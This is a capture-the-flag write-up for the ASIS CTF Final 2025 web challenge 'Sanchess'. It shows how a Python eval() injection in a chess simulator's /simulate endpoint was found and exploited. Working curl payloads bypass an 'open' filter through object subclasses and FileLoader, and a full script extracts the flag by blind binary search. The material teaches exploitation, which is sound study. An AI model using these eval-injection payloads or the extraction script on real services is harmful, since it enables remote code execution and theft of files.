---
layout: post
title: "Sanchess"
categories: [web, ASISCTF-Final2025]
date: 2025-12-28 90:00:00 -0500
writeup: true
permalink: /write-ups/sanchess/
order: 6
---

**ASIS CTF Final**

**Challenge:** Sanchess

**Category:** Web

**Flag:** ``ASIS{7h!nk_0u7_OF_7h3_B0X_r!cK}``

I participated with tjcsc in this CTF and we got 17th place!

We're given a URL, ``http://65.109.194.105:9090/``.
We also know that the flag is in ``flag.txt``.

First, let's visit the URL:
![visiting the url](sanchessapp.png)

It's a chess app where we can give Rick up to 10 moves to make.
Interestingly, we can add a condition to the move, which will come in handy later.

For now, let's curl the URL to get the HTML source:
``curl http://65.109.194.105:9090/``

I'll spare you the entire source, but here are the important parts:

We learn that there is a ``/simulate`` endpoint that accepts JSON:
```
const res = await fetch("/simulate", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify(payload)
});
```

Here, we can see the format expected at ``/simulate``:
```
if (type === "simple") {
  const dir = block.querySelector(".simple-direction").value;
  moves.push({
    type: "simple",
    direction: dir
  });
} else {
  // ...
  if (condTypeVal === "dist_gt" || condTypeVal === "dist_lt") {
    conditionObj = {
      type: "distance",
      op: condTypeVal === "dist_gt" ? ">" : "<",
      value: xVal
    };
  }
  // ...
  moves.push({
    type: "conditional",
    condition: conditionObj,
    then: thenDir,
    else: elseDir
  });
}
```

OK, now that we have more information, let's try a simple input:
```
curl -X POST http://65.109.194.105:9090/simulate \
  -H "Content-Type: application/json" \
  -d '{"rick":{"row":5,"col":4},"morty":{"row":7,"col":2},"moves":[{"type":"simple","direction":"down"}]}'
```

This gives us the expected output:
```
{
  "path": [
    {
      "col": 4,
      "row": 5
    },
    {
      "col": 4,
      "row": 6
    }
  ]
}
```

Now let's try a conditional input:
```
curl -X POST http://65.109.194.105:9090/simulate \
  -H "Content-Type: application/json" \
  -d '{"rick":{"row":5,"col":4},"morty":{"row":7,"col":2},"moves":[{"type":"conditional","condition":{"type":"distance","op":">","value":0},"then":"down","else":"up"}]}'
```

Output:
```
{
  "path": [
    {
      "col": 4,
      "row": 5
    },
    {
      "col": 4,
      "row": 6
    }
  ]
}
```

Alright, none of that was surprising.

However, I see something interesting in the source.

Let's look at how the JSON is sent to the backend from the frontend:
```
conditionObj = {
  type: "distance",
  op: condTypeVal === "dist_gt" ? ">" : "<",
  value: xVal
};
```
```
moves.push({
  type: "conditional",
  condition: conditionObj,
  then: thenDir,
  else: elseDir
});
```
```
const payload = {
  rick: {row: rickStart.row, col: rickStart.col},
  morty: {row: mortyPos.row, col: mortyPos.col},
  moves: moves
};
```
```
const res = await fetch("/simulate", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify(payload)
});
```

So, the frontend only generates ``op`` for either ``<`` or ``>``.
However, the backend may not be limited to those two operators.

Let's try ``==`` to make sure:
```
curl -X POST http://65.109.194.105:9090/simulate \
  -H "Content-Type: application/json" \
  -d '{"rick":{"row":5,"col":4},"morty":{"row":7,"col":2},"moves":[{"type":"conditional","condition":{"type":"distance","op":"==","value":5},"then":"down","else":"up"}]}'
```
Response:
```
{
  "path": [
    {
      "col": 4,
      "row": 5
    },
    {
      "col": 4,
      "row": 4
    }
  ]
}
```

It worked! Now, let's test for ``eval()`` with a Python comment:
```
curl -X POST http://65.109.194.105:9090/simulate \
  -H "Content-Type: application/json" \
  -d '{"rick":{"row":5,"col":4},"morty":{"row":7,"col":2},"moves":[{"type":"conditional","condition":{"type":"distance","op":">0#","value":0},"then":"down","else":"up"}]}'
```
Response:
```
{
  "path": [
    {
      "col": 4,
      "row": 5
    },
    {
      "col": 4,
      "row": 6
    }
  ]
}
```

That went through too!

Ok, now we know that the backend is using ``eval()`` and accepts more ops than the frontend sends.
Critically, ``eval()`` allows the execution of arbitrary Python expressions, so we might be able to use it to read the flag file!

Let's try to access it using ``open``:
```
curl -X POST http://65.109.194.105:9090/simulate \
  -H "Content-Type: application/json" \
  -d '{"rick":{"row":5,"col":4},"morty":{"row":7,"col":2},"moves":[{"type":"conditional","condition":{"type":"distance","op":">0 if open(\"flag.txt\") else","value":0},"then":"down","else":"up"}]}'
```
Response:
```
{
  "Error": "Invalid Request"
}
```

![Nervous gulp](gulp.gif)

...Maybe open is filtered somehow. Let's try using something else.

We could try FileLoader, which we can get by listing the subclasses of Object:
```
curl -X POST http://65.109.194.105:9090/simulate \
  -H "Content-Type: application/json" \
  -d '{"rick":{"row":5,"col":4},"morty":{"row":7,"col":2},"moves":[{"type":"conditional","condition":{"type":"distance","op":">0 if [x.get_data(\".\",\"flag.txt\") for x in \"\".__class__.__mro__[1].__subclasses__() if \"FileLoader\" in str(x)] else","value":0},"then":"down","else":"up"}]}'
```
Response:
```
{
  "path": [
    {
      "col": 4,
      "row": 5
    },
    {
      "col": 4,
      "row": 6
    }
  ]
}
```

That worked! We successfully read the flag file, but all the outputs we have access to are "True" or "False..."

Maybe we can check individual indexes?
We know the flag format is ASIS{...}, so let's check for A:
```
curl -X POST http://65.109.194.105:9090/simulate \
  -H "Content-Type: application/json" \
  -d '{"rick":{"row":5,"col":4},"morty":{"row":7,"col":2},"moves":[{"type":"conditional","condition":{"type":"distance","op":">0 if [x.get_data(\"/app\",\"flag.txt\")[0]==65 for x in \"\".__class__.__mro__[1].__subclasses__() if \"FileLoader\" in str(x)][0] else","value":0},"then":"down","else":"up"}]}'
```
Response:
```
{
  "path": [
    {
      "col": 4,
      "row": 5
    },
    {
      "col": 4,
      "row": 6
    }
  ]
}
```
We have row 6, meaning the first character is A and we CAN check individual characters!

Now all that's left to do is put together a script that uses a binary search to find each character.
Here's mine:
```
import requests

url = "http://65.109.194.105:9090/simulate"

def check_gt(index, value):
    payload = {
        "rick": {"row": 5, "col": 4},
        "morty": {"row": 7, "col": 2},
        "moves": [{
            "type": "conditional",
            "condition": {
                "type": "distance",
                "op": f'>0 if [x.get_data(".","flag.txt")[{index}]>{value} for x in "".__class__.__mro__[1].__subclasses__() if "FileLoader" in str(x)][0] else',
                "value": 0
            },
            "then": "down",
            "else": "up"
        }]
    }
    r = requests.post(url, json=payload, timeout=10)
    data = r.json()
    return "path" in data and len(data["path"]) > 1 and data["path"][1]["row"] == 6

def get_byte(index):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        if check_gt(index, mid):
            low = mid + 1
        else:
            high = mid
    return low

flag = ""
for i in range(50):
    flag += chr(get_byte(i))
    print(flag)
    if flag.endswith("}"):
        break
```

Using this, we get the final output:
``ASIS{7h!nk_0u7_OF_7h3_B0X_r!cK}``
